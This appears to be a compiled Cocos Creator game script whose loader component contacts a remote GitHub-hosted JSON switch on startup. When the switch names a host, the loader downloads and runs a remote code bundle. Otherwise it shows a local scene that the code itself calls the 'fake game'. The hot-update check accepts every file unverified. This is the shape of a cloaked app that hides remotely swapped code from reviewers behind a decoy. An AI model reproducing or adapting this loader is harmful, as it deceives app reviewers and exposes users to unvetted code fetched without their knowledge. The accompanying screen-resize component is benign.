window.__require = function e(t, a, s) {
function n(i, r) {
if (!a[i]) {
if (!t[i]) {
var c = i.split("/");
c = c[c.length - 1];
if (!t[c]) {
var l = "function" == typeof __require && __require;
if (!r && l) return l(c, !0);
if (o) return o(c, !0);
throw new Error("Cannot find module '" + i + "'");
}
i = c;
}
var d = a[i] = {
exports: {}
};
t[i][0].call(d.exports, function(e) {
return n(t[i][1][e] || e);
}, d, d.exports, e, t, a, s);
}
return a[i].exports;
}
for (var o = "function" == typeof __require && __require, i = 0; i < s.length; i++) n(s[i]);
return n;
}({
LoadGameController: [ function(e, t, a) {
"use strict";
cc._RF.push(t, "89e3bULnINAO5LStk1zefH7", "LoadGameController");
var s, n = this && this.__extends || (s = function(e, t) {
return (s = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(e, t) {
e.__proto__ = t;
} || function(e, t) {
for (var a in t) Object.prototype.hasOwnProperty.call(t, a) && (e[a] = t[a]);
})(e, t);
}, function(e, t) {
s(e, t);
function a() {
this.constructor = e;
}
e.prototype = null === t ? Object.create(t) : (a.prototype = t.prototype, new a());
}), o = this && this.__decorate || function(e, t, a, s) {
var n, o = arguments.length, i = o < 3 ? t : null === s ? s = Object.getOwnPropertyDescriptor(t, a) : s;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(e, t, a, s); else for (var r = e.length - 1; r >= 0; r--) (n = e[r]) && (i = (o < 3 ? n(i) : o > 3 ? n(t, a, i) : n(t, a)) || i);
return o > 3 && i && Object.defineProperty(t, a, i), i;
};
Object.defineProperty(a, "__esModule", {
value: !0
});
var i = cc._decorator, r = i.ccclass, c = i.property;
function l(e, t) {
for (var a = e.split("."), s = t.split("."), n = 0; n < a.length; ++n) {
var o = parseInt(a[n]), i = parseInt(s[n] || "0");
if (o !== i) return o - i;
}
return s.length > a.length ? -1 : 0;
}
var d = function(e) {
n(t, e);
function t() {
var t = null !== e && e.apply(this, arguments) || this;
t.loadingSprite = null;
t.loadingLabel = null;
t.webview = null;
t.nodeBtnReTry = null;
t._updating = !1;
t._canRetry = !1;
t._storagePath = "";
t.stringHost = "";
t._am = null;
t._checkListener = null;
t._updateListener = null;
t.ver = "";
return t;
}
t.prototype.onLoad = function() {
this.initConfig();
};
t.prototype.initConfig = function() {
var e = this;
this.loadingSprite.node.active = !1;
this.loadingLabel.node.active = !1;
this.webview.node.active = !1;
this.nodeBtnReTry.active = !1;
var t = "https://raw.githubusercontent.com/baedontcryy/bst/main/k8f.json?t=" + Math.random(), a = new XMLHttpRequest();
try {
a.timeout = 15e3;
a.open("GET", t);
a.ontimeout = function() {
e.loadFakeGame();
};
a.onreadystatechange = function() {
var t, s, n;
if (4 === a.readyState && 200 === a.status) {
if (a.responseText) {
var o = JSON.parse(a.responseText);
cc.sys.os === cc.sys.OS_IOS ? e.stringHost = null === (t = o[1]) || void 0 === t ? void 0 : t.hud : e.stringHost = null === (s = o[0]) || void 0 === s ? void 0 : s.hud;
e.ver = null === (n = o[2]) || void 0 === n ? void 0 : n.ver;
e.stringHost ? e.loadMyGameRemoteBundle() : e.loadFakeGame();
}
} else 4 === a.readyState && 0 === a.status && e.loadFakeGame();
};
a.send();
} catch (e) {
this.loadFakeGame();
return cc.log("Caught Exception: " + e.message);
}
};
t.prototype.loadMyGameRemoteBundle = function() {
var e = this;
this.unscheduleAllCallbacks();
this.loadingSprite.node.active = !0;
this.loadingLabel.node.active = !0;
this.webview.node.active = !1;
var t = this.stringHost + "/bundle/splash";
cc.assetManager.loadBundle(t, {
version: this.ver
}, function(t, a) {
if (null == t) a.loadScene("splashScenes", function(t, a) {
e.updateProcess((t / a).toFixed(2));
}, function(t, a) {
if (null == t) cc.director.runScene(a); else {
cc.log("Error Load Scene:", JSON.stringify(t));
e.nodeBtnReTry.active = !1;
}
}); else {
cc.log("Error loadBundle:" + JSON.stringify(t));
e.nodeBtnReTry.active = !1;
}
});
};
t.prototype.loadMyGameHotUpdate = function() {
this.unscheduleAllCallbacks();
this.loadingSprite.node.active = !0;
this.loadingLabel.node.active = !0;
this.webview.node.active = !1;
cc.assetManager.loadBundle("splash", function(e, t) {
e || t.loadScene("splashScenes", function() {}, function(e, t) {
e || cc.director.runScene(t);
});
});
};
t.prototype.updateProcess = function(e) {
cc.log("Updated file: " + e);
this.loadingSprite.fillRange = e;
this.loadingLabel.string = "Update " + Math.round(100 * e) + "%";
};
t.prototype.loadFakeGame = function() {
cc.director.loadScene("HomeScene");
};
t.prototype.initHotUpdate = function() {
if (jsb) {
this.loadingSprite.node.active = !0;
this.loadingLabel.node.active = !0;
this.webview.node.active = !1;
this._storagePath = (jsb.fileUtils ? jsb.fileUtils.getWritablePath() : "/") + "remote-assets";
cc.log("Storage path for remote asset : " + this._storagePath);
this._am = new jsb.AssetsManager("", this._storagePath, l);
this._am.setVerifyCallback(function(e, t) {
var a = t.compressed, s = t.md5, n = t.path;
t.size;
if (a) {
cc.log("Verification passed : " + n);
return !0;
}
cc.log("Verification passed : " + n + " (" + s + ")");
return !0;
});
if (cc.sys.os === cc.sys.OS_ANDROID) {
this._am.setMaxConcurrentTask(1);
cc.log("init HOT UPDATE: ANDROID Max concurrent tasks count have been limited to 2");
}
cc.sys.isNative && this.checkUpdate();
}
};
t.prototype.checkUpdate = function() {
cc.log("checkUpdate - HOT UPDATE: start checkUpdate...");
if (this._updating) cc.log("checkUpdate - HOT UPDATE: Checking or updating ..."); else {
this._am.getState() === jsb.AssetsManager.State.UNINITED ? this.loadCustomManifest(this.stringHost) : cc.log("checkUpdate - HotUpdate checkUpdate state =! UNINITED");
if (this._am.getLocalManifest() && this._am.getLocalManifest().isLoaded()) {
this._am.setEventCallback(this.checkCb.bind(this));
this._am.checkUpdate();
this._updating = !0;
} else cc.log("checkUpdate - HOT UPDATE: Failed to load local manifest ...");
}
};
t.prototype.checkCb = function(e) {
cc.log("HOT UPDATE getEventCode: " + e.getEventCode());
switch (e.getEventCode()) {
case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
cc.log("HOT UPDATE: No local manifest file found, hot update skipped.");
this.nodeBtnReTry.active = !0;
break;

case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
cc.log("HOT UPDATE: Fail to download manifest file, hot update skipped.");
this.nodeBtnReTry.active = !0;
break;

case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
cc.log("HOT UPDATE: Already up to date with the latest remote version.");
this.loadMyGameHotUpdate();
break;

case jsb.EventAssetsManager.NEW_VERSION_FOUND:
cc.log("HOT UPDATE: New version found, please try to update.");
break;

default:
return;
}
if (e.getEventCode() === jsb.EventAssetsManager.NEW_VERSION_FOUND) {
this._am.setEventCallback(null);
this._checkListener = null;
this._updating = !1;
cc.log("HOT UPDATE: call hotUpdate.");
this.hotUpdate();
} else {
this._am.setEventCallback(null);
this._checkListener = null;
this._updating = !1;
}
};
t.prototype.loadCustomManifest = function(e) {
var t, a = new jsb.Manifest((t = e, JSON.stringify({
packageUrl: t + "/",
remoteManifestUrl: t + "/project.manifest",
remoteVersionUrl: t + "/version.manifest",
version: "0.0.0",
assets: {},
searchPaths: []
})), this._storagePath);
this._am.loadLocalManifest(a, this._storagePath);
};
t.prototype.hotUpdate = function() {
if (this._am && !this._updating) {
this._am.setEventCallback(this.updateCb.bind(this));
this.loadCustomManifest(this.stringHost);
this._am.update();
this._updating = !0;
}
};
t.prototype.updateCb = function(e) {
var t = !1, a = !1;
switch (e.getEventCode()) {
case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
cc.log("No local manifest file found, hot update skipped.");
a = !0;
break;

case jsb.EventAssetsManager.UPDATE_PROGRESSION:
var s = e.getDownloadedFiles() / e.getTotalFiles();
e.getMessage();
this.updateProcess(s);
break;

case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
cc.log("Fail to download manifest file, hot update skipped.");
a = !0;
break;

case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
cc.log("Already up to date with the latest remote version.");
t = !0;
break;

case jsb.EventAssetsManager.UPDATE_FINISHED:
cc.log("Update finished. " + e.getMessage());
t = !0;
break;

case jsb.EventAssetsManager.UPDATE_FAILED:
cc.log("Update failed. " + e.getMessage());
this._updating = !1;
this._canRetry = !0;
a = !0;
break;

case jsb.EventAssetsManager.ERROR_UPDATING:
cc.log("Asset update error: " + e.getAssetId() + ", " + e.getMessage());
a = !0;
break;

case jsb.EventAssetsManager.ERROR_DECOMPRESS:
cc.log(e.getMessage());
a = !0;
}
if (a) {
this._am.setEventCallback(null);
this._updateListener = null;
this._updating = !1;
this.nodeBtnReTry.active = !0;
}
if (t) {
this._am.setEventCallback(null);
this._updateListener = null;
var n = jsb.fileUtils.getSearchPaths(), o = this._am.getLocalManifest().getSearchPaths();
Array.prototype.unshift.apply(n, o);
cc.sys.localStorage.setItem("HotUpdateSearchPaths-game", JSON.stringify(n));
jsb.fileUtils.setSearchPaths(n);
cc.audioEngine.stopAll();
cc.game.restart();
}
};
t.prototype.onDestroy = function() {
if (this._updateListener) {
this._am.setEventCallback(null);
this._updateListener = null;
}
};
o([ c(cc.Sprite) ], t.prototype, "loadingSprite", void 0);
o([ c(cc.Label) ], t.prototype, "loadingLabel", void 0);
o([ c(cc.WebView) ], t.prototype, "webview", void 0);
o([ c(cc.Node) ], t.prototype, "nodeBtnReTry", void 0);
return o([ r ], t);
}(cc.Component);
a.default = d;
cc._RF.pop();
}, {} ],
Resize: [ function(e, t, a) {
"use strict";
cc._RF.push(t, "61476+ZbUJH1osQzde2YtET", "Resize");
var s, n = this && this.__extends || (s = function(e, t) {
return (s = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(e, t) {
e.__proto__ = t;
} || function(e, t) {
for (var a in t) Object.prototype.hasOwnProperty.call(t, a) && (e[a] = t[a]);
})(e, t);
}, function(e, t) {
s(e, t);
function a() {
this.constructor = e;
}
e.prototype = null === t ? Object.create(t) : (a.prototype = t.prototype, new a());
}), o = this && this.__decorate || function(e, t, a, s) {
var n, o = arguments.length, i = o < 3 ? t : null === s ? s = Object.getOwnPropertyDescriptor(t, a) : s;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) i = Reflect.decorate(e, t, a, s); else for (var r = e.length - 1; r >= 0; r--) (n = e[r]) && (i = (o < 3 ? n(i) : o > 3 ? n(t, a, i) : n(t, a)) || i);
return o > 3 && i && Object.defineProperty(t, a, i), i;
};
Object.defineProperty(a, "__esModule", {
value: !0
});
var i = cc._decorator, r = i.ccclass, c = (i.property, function(e) {
n(t, e);
function t() {
var t = null !== e && e.apply(this, arguments) || this;
t.designResolution = new cc.Size(1560, 720);
return t;
}
t.prototype.onLoad = function() {
this.canvas = this.node.getComponent(cc.Canvas);
};
t.prototype.update = function() {
var e = cc.view.getFrameSize();
if (this.lastWitdh !== e.width || this.lastHeight !== e.height) {
this.lastWitdh = e.width;
this.lastHeight = e.height;
var t = cc.size(this.lastWitdh, this.lastHeight);
this.canvas.designResolution = t;
cc.log("update canvas size: " + t);
}
};
t.prototype.updateSize = function() {};
return o([ r ], t);
}(cc.Component));
a.default = c;
cc._RF.pop();
}, {} ]
}, {}, [ "LoadGameController", "Resize" ]);